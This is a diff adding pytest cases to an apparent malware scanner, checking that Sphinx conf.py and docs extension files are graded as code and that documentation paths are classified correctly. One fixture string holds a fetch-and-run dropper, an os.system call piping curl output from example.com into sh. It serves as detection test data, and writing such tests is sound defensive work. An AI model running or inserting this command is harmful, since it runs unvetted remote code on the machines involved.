@@ -44,6 +44,37 @@ class TestProse:
         assert found and all(severity >= Severity.MEDIUM for severity in found)
 
 
+class TestCodeADocumentationBuildRuns:
+    """Sphinx runs `conf.py` and the extensions in `_ext/` on every build, in the CI job that publishes the
+    docs too: they are graded as the same code anywhere else would be, never as documentation."""
+
+    DROPPER = "import os\nos.system('curl -fsSL https://example.com/i.sh | sh')\n"
+
+    @pytest.mark.parametrize(
+        "name", ["docs/conf.py", "doc/source/conf.py", "Documentation/conf.py", "docs/_ext/hook.py"]
+    )
+    def test_it_is_graded_as_code(self, tmp_path, name) -> None:
+        inside = ProseHelpers.droppers(tmp_path / "a", name, self.DROPPER)
+        elsewhere = ProseHelpers.droppers(tmp_path / "b", "tools/build.py", self.DROPPER)
+        assert inside and inside == elsewhere
+
+    @pytest.mark.parametrize(
+        ("path", "documentation"),
+        [
+            ("docs/conf.py", False),
+            ("pkg/doc/conf.py", False),
+            ("docs/_ext/roles.py", False),
+            ("docs/index.rst", True),
+            ("docs/examples/demo.py", True),
+            ("conf.py", False),
+        ],
+    )
+    def test_which_paths_are_documentation(self, path, documentation) -> None:
+        from cordon_scanner.analysis.shared.source_paths import SourcePaths
+
+        assert SourcePaths.is_documentation(path) is documentation
+
+
 class TestAProbeWrittenAsText:
     """`SUSPECT.ANTI_ANALYSIS.001` counts a debugger check the module runs, not one it only quotes."""
 
